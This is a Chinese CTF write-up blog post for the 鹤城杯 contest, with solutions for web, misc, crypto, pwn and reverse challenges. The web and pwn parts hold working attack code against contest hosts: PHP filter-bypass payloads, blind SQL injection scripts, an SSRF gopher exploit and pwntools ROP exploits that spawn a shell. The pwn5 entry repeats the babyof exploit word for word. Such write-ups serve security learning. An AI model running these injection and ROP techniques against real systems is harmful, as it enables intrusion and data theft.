---
title: 鹤城杯
tags:
  - null
categories:
  - null
description: "鹤城杯"
top_img: /2.jpg
cover: /image/buu.png
password: sm1le
date: 2021-10-09 20:53:42
top:
---



## web

### middle_magic

```php
<?php
    highlight_file(__FILE__);
    include "./flag.php";
    include "./result.php";
    if(isset($_GET['aaa']) && strlen($_GET['aaa']) < 20){

        $aaa = preg_replace('/^(.*)level(.*)$/', '${1}<!-- filtered -->${2}', $_GET['aaa']);

        if(preg_match('/pass_the_level_1#/', $aaa)){
            echo "here is level 2";
            
            if (isset($_POST['admin']) and isset($_POST['root_pwd'])) {
                if ($_POST['admin'] == $_POST['root_pwd'])
                    echo '<p>The level 2 can not pass!</p>';
            // START FORM PROCESSING    
                else if (sha1($_POST['admin']) === sha1($_POST['root_pwd'])){
                    echo "here is level 3,do you kown how to overcome it?";
                    if (isset($_POST['level_3'])) {
                        $level_3 = json_decode($_POST['level_3']);
                        
                        if ($level_3->result == $result) {
                            
                            echo "success:".$flag;
                        }
                        else {
                            echo "you never beat me!";
                        }
                    }
                    else{
                        echo "out";
                    }
                }
                else{
                    
                    die("no");
                }
            // perform validations on the form data
            }
            else{
                echo '<p>out!</p>';
            }

        }
        
        else{
            echo 'nonono!';
        }

        echo '<hr>';
    }

?>
```

.不匹配0x0a sha1数组参数为NULL 字符串和数字弱比较

payload:

```
?aaa=%0Apass_the_level_1%23&admin[]=1&root_pwd[]=2

POST: admin[]=a&root_pwd[]=2&level_3={"result":0}
```

### easy_sql_2

用下面脚本注出版本

```python
import requests

url="http://182.116.62.85:26571/login.php"
proxies = {
    "http":"127.0.0.1:8080"
}
flag=''
for i in range(1,50):
    f1=flag
    top=127
    low=1
    while low<=top:
        mid=(top+low)//2
        data={"username":"admina'||ascii(substr(version(),{},1))>{}#".format(str(i),str(mid)),"password":"admin"}
        data1={"username":"admina'||ascii(substr(version(),{},1))={}#".format(str(i),str(mid)),"password":"admin"}
                data={"username":"admina'||ascii(substr(version(),{},1))>{}#".format(str(i),str(mid)),"password":"admin"}
        data1={"username":"admina'||ascii(substr(version(),{},1))={}#".format(str(i),str(mid)),"password":"admin"}
        try:
            r1=requests.post(url,data=data1,proxies=proxies)
            print(i,mid)
            if 'login success!' in r1.text:
                flag+=chr(mid)
                print(flag)
                break
            r=requests.post(url,data=data)
            if "login success!" in r.text:
                low=mid+1
            else:
                top=mid-1
        except Exception as e:
            pass
    if flag==f1:
        break

# 8.0.26-0ubuntu0.20.04.2
```

mysql 8.0注入 测试发现 tables CREATE_TIME 被ban了  本地起个docker

```bash
docker run --name mysql8 -e MYSQL_ROOT_PASSWORD=root -d mysql:8.0.26
```

发现用下面代替

```
`information_schema`.`PARTITIONS`   => `information_schema`.`tables` 
```

注意跑的时候最后一个字母位置替换成s中往后一位的字符 exp:

```python
import requests

url = 'http://182.116.62.85:26571/login.php'
flag=''
proxies={
    "http":"127.0.0.1:8080"
}
index=0
s='0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz{}'
for i in range(1,50):
    f1=flag
    for j in s:
        # data = {"username": "aaaaa'||(case/**/when(('def','ctf',binary/**/'{}',null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null)<(table/**/`information_schema`.`PARTITIONS`/**/order/**/by/**/19/**/desc/**/limit/**/0,1))/**/then/**/1/**/else/**/0/**/end)#".format(flag+j), "password": "123"}
        data = {"username": "aaaaa'||(case/**/when((binary/**/'{}')<(table/**/fl11aag/**/limit/**/1,1))/**/then/**/1/**/else/**/0/**/end)#".format(flag+j), "password": "123"}
        try:
            print(i,j)
            r1=requests.post(url, data=data,proxies=proxies)
            if 'username error!' in r1.text:
                flag+=s[s.index(j)-1]
                print(flag)
                break
        except Exception as e:
            print(e)
    if flag==f1:
        break
print(flag)
# fl11aag
# flag{try_again}
# flag{spMG94bd95z7h07ZZhCFXQutxYmKwTtL}
```

### easy_sql_1

SSRF + SQL注入 原题：https://wemp.app/posts/d742fadc-274c-4760-a961-03a24bba5043

exp:

```python
import urllib.parse
import base64
import requests


post_data = 'uname=uname&passwd=passwd'

http = '''POST / HTTP/1.1
Host: 182.116.62.85:28303
Content-Type: application/x-www-form-urlencoded
Content-Length: {}
Connection: close
Cookie: this_is_your_cookie={}

{}
'''

payload = "admin') and updatexml(1,concat(0x7e,(select substr((select flag from flag),1,50))),1)#"
payload = base64.b64encode(payload.encode()).decode() 
gopher = http.format(str(len(post_data)),payload,post_data).replace("\n","\r\n")
gopher = urllib.parse.quote(urllib.parse.quote(gopher))

gopher = 'gopher://127.0.0.1:80/'+'_'+gopher
print(gopher)
url  = "http://182.116.62.85:28303/use.php?url="+gopher
web = requests.get(url)
print(web.text)
```

### EasyP

```php
 <?php
include 'utils.php';

if (isset($_POST['guess'])) {
    $guess = (string) $_POST['guess'];
    if ($guess === $secret) {
        $message = 'Congratulations! The flag is: ' . $flag;
    } else {
        $message = 'Wrong. Try Again';
    }
}

if (preg_match('/utils\.php\/*$/i', $_SERVER['PHP_SELF'])) {
    exit("hacker :)");
}

if (preg_match('/show_source/', $_SERVER['REQUEST_URI'])){
    exit("hacker :)");
}

if (isset($_GET['show_source'])) {
    highlight_file(basename($_SERVER['PHP_SELF']));
    exit();
}else{
    show_source(__FILE__);
}
?> 
```

basename函数会删除一些不可显示字符 show_source过滤使用php字符串解析特性绕

payload:

```
/index.php/utils.php/%fa?show+source
```

![image-20211008152333770](https://gitee.com/taochiyu/blogimage/raw/master/img/20211009114229.png)

### Spring

漏洞复现 ：https://github.com/Medicean/VulApps/tree/master/s/springwebflow/1

![image-20211008170939237](https://gitee.com/taochiyu/blogimage/raw/master/img/20211009114306.png)

反弹shell用：http://www.jackson-t.ca/runtime-exec-payloads.html

![image-20211008171006863](https://gitee.com/taochiyu/blogimage/raw/master/img/20211009114307.png)

## misc

### new_misc

pdf 隐写 **wbs43open** 一把梭

![image-20211008113611365](https://gitee.com/taochiyu/blogimage/raw/master/img/20211009114308.png)

flag:

```
flag{verY_g00d_YoU_f0und_th1s}
```

### 2

```
#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Time    : 2021/10/8 9:22
# @Author  : upload
# @File    : 11111111.py
# @Software: PyCharm

a = [102,108,97,103,123,119,49,114,101,115,104,65,82,75,95,101,122,95,49,115,110,116,105,116,125,126,126,126,126]

sss = ''
for i in a:

    sss += chr(i)


print(sss)
```

```
flag{w1reshARK_ez_1sntit}~~~~
```

### Misc2

Stegsolve 打开 html实体编码

![image-20211008115820742](https://gitee.com/taochiyu/blogimage/raw/master/img/20211009114309.png)

```
&#x66;&#x6c;&#x61;&#x67;&#x7b;&#x68;&#x30;&#x77;&#x5f;&#x34;&#x62;&#x6f;&#x75;&#x54;&#x5f;&#x65;&#x6e;&#x63;&#x30;&#x64;&#x65;&#x5f;&#x34;&#x6e;&#x64;&#x5f;&#x70;&#x6e;&#x47;&#x7d;
```

CyberChef解码

![image-20211008115902186](https://gitee.com/taochiyu/blogimage/raw/master/img/20211009114310.png)

flag:

```
flag{h0w_4bouT_enc0de_4nd_pnG}
```



### 3

先暴力破解密码 ： qwer

修改图片该高度！ 

流量分析 筛选http包

http.request.method==POST 盲注得到flag

![在这里插入图片描述](https://img-blog.csdnimg.cn/c6db28a5291c4c749ccb9800dd94a491.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5p6X5LiA5LiN5pivMDE=,size_20,color_FFFFFF,t_70,g_se,x_16)



### 4M1

原题复现：`http://www.glun.top/2020/10/05/ctf02/`

先获取到密钥！ 

然后分析流量： 是sql注入流量！

根据hint_for_capture.txt的提示，得到的内容经过了base85编码。

输出base 85 解码得到：

```
flag is md5("Sq1it3"+压缩包密码)
Hint: 密码是一个身份证号，且出生年份恰有两个质因子
```

用网上的脚本直接得到

计算md5(“Sq1it332070119840810108X”)即得到flag。

```
flag{5cae25efeb73d7ba22f7728427376f59}
```



## cry



### 1

![image-20211008092401255](https://gitee.com/taochiyu/blogimage/raw/master/img/20211008092408.png)



### 2

```
4O595954494Q32515046324757595N534R52415653334357474R4N575955544R4O5N4Q46434S4O59474253464Q5N444R4Q51334557524O5N4S424944473542554O595N44534O324R49565746515532464O49345649564O464R4R494543504N35
```

`ROT13`解密 再16进制解码

![image-20211008201359911](https://gitee.com/taochiyu/blogimage/raw/master/img/20211008201408.png)

再接着转`base32` 转bsae64 转base85



![image-20211008201302317](https://gitee.com/taochiyu/blogimage/raw/master/img/20211008201302.png)

### 3 

原题复现：`http://www.zbc53.top/archives/148/`



首先是给了p的高位300比特，q的低位，显然单靠一个因子是无法恢复p,q的，一般来说高位攻击1024比特的因子得已知570位，而两个加起来恰好相近，根据q的低位求出p的低位，再爆破点比特位就行了。



```python
from gmpy2 import *
from Crypto.Util.number import *
 
p1 = 1514296530850131082973956029074258536069144071110652176122006763622293335057110441067910479
q0 = 40812438243894343296354573724131194431453023461572200856406939246297219541329623
n = 21815431662065695412834116602474344081782093119269423403335882867255834302242945742413692949886248581138784199165404321893594820375775454774521554409598568793217997859258282700084148322905405227238617443766062207618899209593375881728671746850745598576485323702483634599597393910908142659231071532803602701147251570567032402848145462183405098097523810358199597631612616833723150146418889589492395974359466777040500971885443881359700735149623177757865032984744576285054725506299888069904106805731600019058631951255795316571242969336763938805465676269140733371287244624066632153110685509892188900004952700111937292221969
mod=pow(2,265)
p0=n*invert(q0,mod)%mod
pbar=(p1<<724)+p0
PR.<x> = PolynomialRing(Zmod(n))
 
for i in range(32):
    f=pbar+x*mod*32
    f=f.monic()
    pp=f.small_roots(X=2^454,beta=0.4)
    if(pp):
        break
    pbar+=mod
 
p=pbar+pp[0]*32*mod
assert n%p==0
print(p)
 
q=n//p
phi=(p-1)*(q-1)
e=65537
d=invert(e,phi)
c=19073695285772829730103928222962723784199491145730661021332365516942301513989932980896145664842527253998170902799883262567366661277268801440634319694884564820420852947935710798269700777126717746701065483129644585829522353341718916661536894041337878440111845645200627940640539279744348235772441988748977191513786620459922039153862250137904894008551515928486867493608757307981955335488977402307933930592035163126858060189156114410872337004784951228340994743202032248681976932591575016798640429231399974090325134545852080425047146251781339862753527319093938929691759486362536986249207187765947926921267520150073408188188
m=pow(c,d,n)
print(long_to_bytes(m))
#flag{ef5e1582-8116-4f61-b458-f793dc03f2ff}
```



### 4

低加密指数广播攻击

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Time    : 2021/10/8 15:28
# @Author  : upload
# @File    : asdada.py
# @Software: PyCharm
import gmpy2
import libnum
from gmpy2 import*
from Crypto.Util.number import*
from libnum import*
e = 9

n0 = 71189786319102608575263218254922479901008514616376166401353025325668690465852130559783959409002115897148828732231478529655075366072137059589917001875303598680931962384468363842379833044123189276199264340224973914079447846845897807085694711541719515881377391200011269924562049643835131619086349617062034608799
c0 = 62580922178008480377006528793506649089253164524883696044759651305970802215270721223149734532870729533611357047595181907404222690394917605617029675103788705320032707977225447998111744887898039756375876685711148857676502670812333076878964148863713993853526715855758799502735753454247721711366497722251078739585

n1 = 92503831027754984321994282254005318198418454777812045042619263533423066848097985191386666241913483806726751133691867010696758828674382946375162423033994046273252417389169779506788545647848951018539441971140081528915876529645525880324658212147388232683347292192795975558548712504744297104487514691170935149949
c1 = 46186240819076690248235492196228128599822002268014359444368898414937734806009161030424589993541799877081745454934484263188270879142125136786221625234555265815513136730416539407710862948861531339065039071959576035606192732936477944770308784472646015244527805057990939765708793705044236665364664490419874206900

n2 = 100993952830138414466948640139083231443558390127247779484027818354177479632421980458019929149817002579508423291678953554090956334137167905685261724759487245658147039684536216616744746196651390112540237050493468689520465897258378216693418610879245129435268327315158194612110422630337395790254881602124839071919
c2 = 85756449024868529058704599481168414715291172247059370174556127800630896693021701121075838517372920466708826412897794900729896389468152213884232173410022054605870785910461728567377769960823103334874807744107855490558726013068890632637193410610478514663078901021307258078678427928255699031215654693270240640198

n3 = 59138293747457431012165762343997972673625934330232909935732464725128776212729547237438509546925172847581735769773563840639187946741161318153031173864953372796950422229629824699580131369991913883136821374596762214064774480548532035315344368010507644630655604478651898097886873485265848973185431559958627423847
c3 = 14388767329946097216670270960679686032536707277732968784379505904021622612991917314721678940833050736745004078559116326396233622519356703639737886289595860359630019239654690312132039876082685046329079266785042428947147658321799501605837784127004536996628492065409017175037161261039765340032473048737319069656

n4 = 66827868958054485359731420968595906328820823695638132426084478524423658597714990545142120448668257273436546456116147999073797943388584861050133103137697812149742551913704341990467090049650721713913812069904136198912314243175309387952328961054617877059134151915723594900209641163321839502908705301293546584147
c4 = 1143736792108232890306863524988028098730927600066491485326214420279375304665896453544100447027809433141790331191324806205845009336228331138326163746853197990596700523328423791764843694671580875538251166864957646807184041817863314204516355683663859246677105132100377322669627893863885482167305919925159944839

n5 = 120940513339890268554625391482989102665030083707530690312336379356969219966820079510946652021721814016286307318930536030308296265425674637215009052078834615196224917417698019787514831973471113022781129000531459800329018133248426080717653298100515701379374786486337920294380753805825328119757649844054966712377
c5 = 2978800921927631161807562509445310353414810029862911925227583943849942080514132963605492727604495513988707849133045851539412276254555228149742924149242124724864770049898278052042163392380895275970574317984638058768854065506927848951716677514095183559625442889028813635385408810698294574175092159389388091981

n6 = 72186594495190221129349814154999705524005203343018940547856004977368023856950836974465616291478257156860734574686154136925776069045232149725101769594505766718123155028300703627531567850035682448632166309129911061492630709698934310123778699316856399909549674138453085885820110724923723830686564968967391721281
c6 = 16200944263352278316040095503540249310705602580329203494665614035841657418101517016718103326928336623132935178377208651067093136976383774189554806135146237406248538919915426183225265103769259990252162411307338473817114996409705345401251435268136647166395894099897737607312110866874944619080871831772376466376

n7 = 69105037583161467265649176715175579387938714721653281201847973223975467813529036844308693237404592381480367515044829190066606146105800243199497182114398931410844901178842049915914390117503986044951461783780327749665912369177733246873697481544777183820939967036346862056795919812693669387731294595126647751951
c7 = 31551601425575677138046998360378916515711528548963089502535903329268089950335615563205720969393649713416910860593823506545030969355111753902391336139384464585775439245735448030993755229554555004154084649002801255396359097917380427525820249562148313977941413268787799534165652742114031759562268691233834820996

n8 = 76194219445824867986050004226602973283400885106636660263597964027139613163638212828932901192009131346530898961165310615466747046710743013409318156266326090650584190382130795884514074647833949281109675170830565650006906028402714868781834693473191228256626654011772428115359653448111208831188721505467497494581
c8 = 25288164985739570635307839193110091356864302148147148153228604718807817833935053919412276187989509493755136905193728864674684139319708358686431424793278248263545370628718355096523088238513079652226028236137381367215156975121794485995030822902933639803569133458328681148758392333073624280222354763268512333515




n = [n1,n2,n3,n4,n5,n6,n7,n8]
c = [c1,c2,c3,c4,c5,c6,c7,c8]


def CRT(a,n):
    sum = 0
    N = reduce(lambda x,y:x*y,n)   # ni 的乘积,N=n1*n2*n3

    for n_i, a_i in zip(n,a):    # zip()将对象打包成元组
        N_i = N // n_i           #Mi=M/ni
        sum += a_i*N_i*invert(N_i,n_i)   #sum=C1M1y1+C2M2y2+C3M3y3
    return sum % N

x = CRT(c,n)

m = iroot(x,e)[0]           #开e次方根
print(n2s(int(m)))               #数值转字符串

```

```
flag{H0w_Fun_13_HAstads_broadca5t_AtTack!}\x16\x16\x16\x16\x16\x16\x16\x16\x16\x16\x16\x16\x16\x16\x16\x16\x16\x16\x16\x16\x16\x16'
```



## pwn



### babyof



```
#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Time    : 2021/10/8 13:27
# @Author  : upload
# @File    : 2222.py
# @Software: PyCharm
from pwn import *
#p = process("./babyof")
p = remote("182.116.62.85",29394)
context.arch = "amd64"
context.log_level = "debug"
libc = ELF("./libc-2.27.so")
elf = ELF("./babyof")
def g():
        gdb.attach(p)
        input()

main = 0x40066b
base = 0x3ff000

p.recvuntil("Do you know how to do buffer overflow?")

pop_rdi = 0x400743
pop_rsi_r15 = 0x400741

payload = "a"*0x40+"deadbeef"+p64(pop_rdi)+p64(elf.got["puts"])+p64(elf.plt["puts"])+p64(main)
p.sendline(payload)
puts = u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
success("puts:"+hex(puts))
libc_base = puts - libc.sym["puts"]
success("libc_base:"+hex(libc_base))

system = libc_base + libc.sym["system"]
binsh = libc_base + next(libc.search('/bin/sh\x00'))

p.recvuntil("Do you know how to do buffer overflow?")
payload = "a"*0x48+p64(pop_rdi)+p64(binsh)+p64(pop_rsi_r15)+p64(0)*2+p64(system)

p.sendline(payload)

p.interactive()

```

![image-20211008182931826](https://gitee.com/taochiyu/blogimage/raw/master/img/20211008182932.png)



### littleof

```
#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Time    : 2021/10/8 14:30
# @Author  : upload
# @File    : 11111111.py
# @Software: PyCharm
from pwn import *
#p = process("./littleof")
p = remote("182.116.62.85",27056)
context.arch = "amd64"
context.log_level = "debug"
libc = ELF("./libc-2.27.so")
elf = ELF("./littleof")
def g():
        gdb.attach(p)
        input()

main = 0x400789
base = 0x3ff000

p.recvuntil("Do you know how to do buffer overflow?")
p.send("a"*0x47+"b"+"c")
p.recvuntil("b")
canary = u64(p.recv(8).ljust(8,"\x00"))
canary = canary & 0xFFFFFFFFFFFFFF00
success("canary:"+hex(canary))

pop_rdi = 0x400863
pop_rsi_r15 = 0x400861
p.recvuntil("!")
payload = "a"*0x48+p64(canary)+"deadbeef"+p64(pop_rdi)+p64(elf.got["puts"])+p64(elf.plt["puts"])+p64(main)
p.sendline(payload)
puts = u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
success("puts:"+hex(puts))
libc_base = puts - libc.sym["puts"]
success("libc_base:"+hex(libc_base))

system = libc_base + libc.sym["system"]
binsh = libc_base + next(libc.search('/bin/sh\x00'))

p.recvuntil("Do you know how to do buffer overflow?")
payload = "a"*0x48+p64(canary)*2+p64(pop_rdi)+p64(binsh)+p64(pop_rsi_r15)+p64(0)*2+p64(system)

p.sendline(payload)

p.interactive()

```



![image-20211008183201557](https://gitee.com/taochiyu/blogimage/raw/master/img/20211008200742.png)

### easycho



```
#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Time    : 2021/10/8 15:47
# @Author  : upload
# @File    : easycho.py
# @Software: PyCharm
from pwn import *

ip = "182.116.62.85"
port =24842
io = remote(ip,port)
io = process('./easyecho')
elf = ELF('./easyecho')
context(log_level='debug', os='linux', arch='amd64')

io.recvuntil("Name:")
io.send(b'A' * 16)

io.recvuntil("Welcome AAAAAAAAAAAAAAAA")
leak = u64(io.recv(6).ljust(8, b'\x00'))
pie_base = leak - 0xcf0
success(hex(leak))
success(hex(pie_base))
flag = pie_base + 0x0202040
io.recvuntil("Input:")
io.sendline('backdoor')

io.recvuntil("Input:")
io.sendline(b'a' * 352 + p64(0) + p64(flag))
# gdb.attach(io)

io.recvuntil("Input:")
io.sendline('exitexit')
# gdb.attach(io)
io.interactive()
```



### onecho



```
#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Time    : 2021/10/8 17:46
# @Author  : upload
# @File    : onecho.py
# @Software: PyCharm
from pwn import *

context.log_level = "debug"
# p = process("./onecho")
p = remote("182.116.62.85", 24143)
elf = ELF("./onecho")
libc = ELF("./libc.so.6")


def exp():
    p.recvuntil('[*] Input your name:')
    puts_plt = 0x8049184
    pop_ret = 0x08049022  # : pop ebx ; ret
    s = 0x0804C100

    vul = 0x80495C6

    buf = 0x0804c200
    pop3_ret = 0x8049811
    pop2_ret = 0x8049812
    read_plt = 0x8049134

    payload = '\x00' + 'a' * (0x10c - 1)
    payload += 'b' * 0x4
    payload += p32(pop_ret) + p32(s)
    payload += p32(puts_plt) + p32(pop_ret) + p32(elf.got['puts'])
    payload += p32(read_plt) + p32(pop3_ret) + p32(0) + p32(buf) + p32(0x8)
    payload += p32(vul)

    p.sendline(payload)
    sleep(0.2)
    p.send('flag\x00')
    libc_base = u32(p.recvuntil('\xf7')[-4:]) - libc.sym['puts']

    open_addr = libc_base + libc.sym['open']
    read = libc_base + libc.sym['read']

    orw = p32(open_addr) + p32(pop2_ret) + p32(buf) + p32(0)
    orw += p32(read) + p32(pop3_ret) + p32(3) + p32(buf + 0x100) + p32(0x30)
    orw += p32(puts_plt) + p32(vul) + p32(buf + 0x100)

    menu = 0x804953E

    payload = '\x00' + 'a' * (0x10c - 1)
    payload += 'b' * 0x4
    payload += p32(pop_ret) + p32(s) + p32(pop_ret) + p32(0)
    payload += p32(open_addr) + p32(pop2_ret) + p32(buf) + p32(0)
    payload += p32(read_plt) + p32(pop3_ret) + p32(3) + p32(0x0804c600) + p32(0x100)
    payload += p32(puts_plt) + p32(puts_plt) + p32(0x0804c600) + p32(menu)
    p.sendline(payload)


exp()
p.interactive()
```

![image-20211008202947825](https://gitee.com/taochiyu/blogimage/raw/master/img/20211008202947.png)



### pwn5



原题复现：`https://www.cnblogs.com/hawkJW/articles/pwn_supermarket.html`

```
#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Time    : 2021/10/8 18:27
# @Author  : upload
# @File    : 2222.py
# @Software: PyCharm
from pwn import *
#p = process("./babyof")
p = remote("182.116.62.85",29394)
context.arch = "amd64"
context.log_level = "debug"
libc = ELF("./libc-2.27.so")
elf = ELF("./babyof")
def g():
        gdb.attach(p)
        input()

main = 0x40066b
base = 0x3ff000

p.recvuntil("Do you know how to do buffer overflow?")

pop_rdi = 0x400743
pop_rsi_r15 = 0x400741

payload = "a"*0x40+"deadbeef"+p64(pop_rdi)+p64(elf.got["puts"])+p64(elf.plt["puts"])+p64(main)
p.sendline(payload)
puts = u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
success("puts:"+hex(puts))
libc_base = puts - libc.sym["puts"]
success("libc_base:"+hex(libc_base))

system = libc_base + libc.sym["system"]
binsh = libc_base + next(libc.search('/bin/sh\x00'))

p.recvuntil("Do you know how to do buffer overflow?")
payload = "a"*0x48+p64(pop_rdi)+p64(binsh)+p64(pop_rsi_r15)+p64(0)*2+p64(system)

p.sendline(payload)

p.interactive()

```



![image-20211008203646290](https://gitee.com/taochiyu/blogimage/raw/master/img/20211008203709.png)





## re

### 1

原题复现：`https://github.com/1094093288/IMG/blob/ca734eefff1e573922ebbcf12d87631c91929e4d/Pwn/renhang_petition_re/wp.md`



发现一大堆xor，但是还是可以看到一些踪迹，汇编用xor实现了字符串的拼接，实现打印信息，再往下scanf输入函数：

```
.text:000010FB                 call    $+5
.text:00001100                 xor     ebx, ebx
.text:00001102                 xor     ebx, [esp+124h+var_124]
.text:00001105                 xor     [esp+124h+var_124], ebx
.text:00001108                 xor     [esp+124h+var_124], eax
.text:0000110B                 call    scanf           ; input = flagggggggggggggggggg
.text:00001110                 xor     esp, esp
.text:00001112                 xor     esp, edi        ; edi = input
```



利用网上的脚本

```
import idc
# idc.print_insn_mnem(cur_addr) 获取助记符
# idc.print_operand(cur_addr,0) 第一个操作数
# idc.print_operand(cur_addr,1) 第二个操作数
start = 0x1040
end = 0x289B
cur_addr = start
while cur_addr <= end:
	if idc.print_insn_mnem(cur_addr) == "xor" and idc.print_operand(cur_addr, 0) == "bl" and idc.print_operand(cur_addr, 1) == "[esi]":
		cur_addr = idc.next_head(cur_addr, end)
		r1 = int(idc.print_operand(cur_addr, 1)[:-1], 16) & 0xFF  # 0x1e......etc
		for i in range(15):
			cur_addr = idc.next_head(cur_addr, end)
		r2 = int(idc.print_operand(cur_addr, 1)[:-1], 16) & 0xFF  # 0x3e
		cur_addr = idc.next_head(cur_addr, end)
		r3 = int(idc.print_operand(cur_addr, 1)[:-1], 16) & 0xFF  # 0x46
		print(chr(r1 ^ r2 ^ r3), end='')
	cur_addr = idc.next_head(cur_addr, end)
```

得到flag为`flag{96c69646-8184-4363-8de9-73f7398066c1}`

